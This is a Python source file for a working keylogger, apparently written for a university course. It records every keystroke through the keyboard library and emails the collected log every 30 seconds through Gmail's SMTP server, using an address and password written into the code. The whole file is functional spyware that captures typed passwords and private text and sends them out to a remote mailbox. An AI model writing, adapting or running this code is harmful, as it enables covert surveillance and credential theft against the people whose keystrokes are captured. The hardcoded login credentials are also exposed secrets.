import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from datetime import date

#How often to generate report in seconds
REPORT_TIMER = 30

#Email credentials
EMAIL = "keyloggercmsc414@gmail.com"
EMAILPWD = "Keys-414!"

class Keylogger:
    def __init__(self, timer, method="email"):
        self.timer = timer
        self.method = method
        self.keylog = ""
        self.startTime = date.today()
        self.endTime = date.today()

    def callback(self, key):
        name = key.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.keylog += name

    def filename_datetime(self):
        self.filename = f"keylog"

    def file_report(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.keylog, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, pwd, content):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, pwd)
        server.sendmail(email, email, content)
        server.quit()

    def report(self):
        if self.keylog:
            self.endTime = datetime.now()
            self.filename_datetime()
            if self.method == "email":
                self.sendmail(EMAIL, EMAILPWD, self.keylog)
            elif self.method == "file":
                self.file_report()
            self.startTime = datetime.now()
        self.keylog = ""
        timer = Timer(interval=self.timer, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.startTime = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(timer=REPORT_TIMER, method="email")
    keylogger.start()




